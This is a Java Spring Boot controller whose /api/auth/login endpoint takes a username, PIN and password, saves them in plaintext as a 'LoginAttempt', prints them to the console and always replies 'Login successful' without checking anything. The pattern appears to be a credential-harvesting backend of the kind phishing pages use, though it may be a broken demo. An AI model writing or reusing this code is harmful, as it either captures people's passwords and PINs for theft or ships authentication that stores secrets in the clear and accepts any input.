package com.enviro.controller;

import com.enviro.domain.LoginAttempt;
import com.enviro.dto.LoginRequest;
import com.enviro.repository.LoginRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/api/auth")
@CrossOrigin(origins = "http://localhost:3001")
public class LoginController {

    @Autowired
    private LoginRepository loginRepository;

    @PostMapping("/login")
    public ResponseEntity<String> handleLogin(@RequestBody LoginRequest request) {
        LoginAttempt attempt = new LoginAttempt(
                request.getUsername(),
                request.getPin(),
                request.getPassword()
        );
        loginRepository.save(attempt);
        System.out.println("Login successful: " + attempt);
        return ResponseEntity.ok("Login successful");
    }
}
